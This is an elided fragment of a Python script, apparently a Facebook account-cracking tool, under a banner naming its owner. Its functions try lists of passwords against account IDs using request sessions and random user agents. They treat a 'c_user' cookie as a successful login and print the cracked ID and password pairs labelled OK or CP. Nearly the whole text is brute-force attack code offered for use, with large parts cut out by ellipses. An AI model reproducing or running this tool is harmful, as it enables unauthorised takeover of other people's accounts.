...
\033[1;32m════════════════════════════════════════════
\033[1;32m[+]     Owner    : JIHAD᭄➼
\033[1;32m[+]     Facebook : REFRESH JIHAD᭄➼
\033[1;32m[+]     Version  : 1.0
\033[1;32m[+]     Git hop  : J1H4D-2-0᭄➼
...
def fia():    
			print(logo)
			print('\x1b[97;1m[✓] ꧁BAD᭄➼  VERSION :\x1b[1;92m 1.0 ')
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				print('\r\r\033[1;31m[꧁BAD᭄➼-CP] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[꧁BAD᭄➼-OK] '+ids+' | '+pas+'\033[1;97m')
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[꧁BAD᭄➼] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				print('\r\r\033[1;32m[꧁BAD᭄➼-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[꧁BAD᭄➼-CP] '+ids+' | '+pas+'\033[1;97m')
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97m꧁BAD᭄➼\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[꧁BAD᭄➼-CP] '+uid+' | '+ps+'\033[1;32m')
